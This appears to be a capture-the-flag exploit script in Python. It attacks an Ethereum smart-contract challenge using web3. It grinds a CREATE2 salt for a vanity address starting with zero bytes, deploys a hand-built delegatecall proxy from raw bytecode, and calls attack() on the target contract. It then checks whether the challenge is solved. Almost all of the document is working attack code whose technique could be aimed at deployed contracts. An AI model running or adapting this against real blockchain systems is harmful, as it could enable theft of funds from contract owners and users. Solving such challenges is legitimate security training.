#!/usr/bin/env python3
import json
from pathlib import Path
from eth_abi import encode
from eth_account import Account
from web3 import Web3

WORKDIR = Path(__file__).resolve().parent
c = json.load(open(WORKDIR / "creds.json"))
bc = json.load(open(WORKDIR / "compiled_bytecode.json"))

w3 = Web3(Web3.HTTPProvider(c["RPC_URL"]))
acct = Account.from_key(c["PRIVKEY"])
print(f"[+] Wallet: {acct.address}  Balance: {w3.from_wei(w3.eth.get_balance(acct.address),'ether')} ETH")

def send_tx(tx):
    tx['from'] = acct.address
    tx['nonce'] = w3.eth.get_transaction_count(acct.address)
    tx['gasPrice'] = w3.eth.gas_price
    if 'gas' not in tx:
        try:
            tx['gas'] = int(w3.eth.estimate_gas(tx) * 2)
        except Exception:
            tx['gas'] = 3_000_000
    signed = acct.sign_transaction(tx)
    h = w3.eth.send_raw_transaction(signed.raw_transaction)
    r = w3.eth.wait_for_transaction_receipt(h)
    if r.status != 1:
        raise RuntimeError(f"tx failed: {r}")
    return r

target_sel = w3.keccak(text="TARGET()")[:4].hex()
palace_sel = w3.keccak(text="PALACE()")[:4].hex()
target_addr = Web3.to_checksum_address("0x"+w3.eth.call({'to':c["SETUP_ADDR"],'data':target_sel}).hex()[-40:])
palace_addr = Web3.to_checksum_address("0x"+w3.eth.call({'to':c["SETUP_ADDR"],'data':palace_sel}).hex()[-40:])
print(f"[+] TARGET={target_addr}  PALACE={palace_addr}")

impl_bin = bytes.fromhex(bc["impl_bin"])
factory_bin = bytes.fromhex(bc["factory_bin"])

print("[*] Deploying Factory...")
rec = send_tx({'data': factory_bin})
factory_addr = rec.contractAddress

print("[*] Grinding CREATE2 vanity salt...")
impl_hash = Web3.keccak(impl_bin)
factory_bytes = bytes.fromhex(factory_addr[2:])
found_salt = None
vanity_addr = None
for salt_int in range(2_000_000):
    salt_bytes = salt_int.to_bytes(32, 'big')
    data = b'\xff' + factory_bytes + salt_bytes + impl_hash
    cand = Web3.keccak(data)[12:]
    if cand[:2] == b'\x00\x00':
        found_salt = salt_bytes
        vanity_addr = Web3.to_checksum_address(cand)
        break
assert found_salt
print(f"[+] vanity={vanity_addr}")

deploy_calldata = w3.keccak(text="deploy(bytes32,bytes)")[:4] + encode(['bytes32','bytes'], [found_salt, impl_bin])
send_tx({'to': factory_addr, 'data': deploy_calldata})
assert len(w3.eth.get_code(vanity_addr)) > 0

vanity_18 = bytes.fromhex(vanity_addr[2:])[2:]
agent_runtime = bytes.fromhex("365f5f375f5f365f71") + vanity_18 + bytes.fromhex("5af43d5f5f3e3d5ff3")
agent_initcode = bytes.fromhex("6024600a5f3960245ff3") + agent_runtime
print("[*] Deploying Agent proxy...")
rec_agent = send_tx({'data': agent_initcode})
agent_addr = rec_agent.contractAddress
deployed = w3.eth.get_code(agent_addr)
assert deployed == agent_runtime, f"mismatch: {deployed.hex()}"
print(f"[+] Agent: {agent_addr}")

print("[*] Executing Agent.attack(TARGET)...")
attack_calldata = w3.keccak(text="attack(address)")[:4] + encode(['address'], [target_addr])
send_tx({'to': agent_addr, 'data': attack_calldata, 'gas': 2_000_000})

def call(addr, sig):
    sel = w3.keccak(text=sig)[:4]
    return w3.eth.call({'to': addr, 'data': sel})

pathOpened = int.from_bytes(call(target_addr, "pathOpened()"), 'big')
is_solved = int.from_bytes(call(c["SETUP_ADDR"], "isSolved()"), 'big')
print(f"[*] pathOpened={bool(pathOpened)} TARGET.bal={w3.from_wei(w3.eth.get_balance(target_addr),'ether')} PALACE.bal={w3.from_wei(w3.eth.get_balance(palace_addr),'ether')}")
print(f"SETUP.isSolved(): {bool(is_solved)}")
if is_solved:
    (WORKDIR / "EXPLOIT_DONE").write_text("ok")
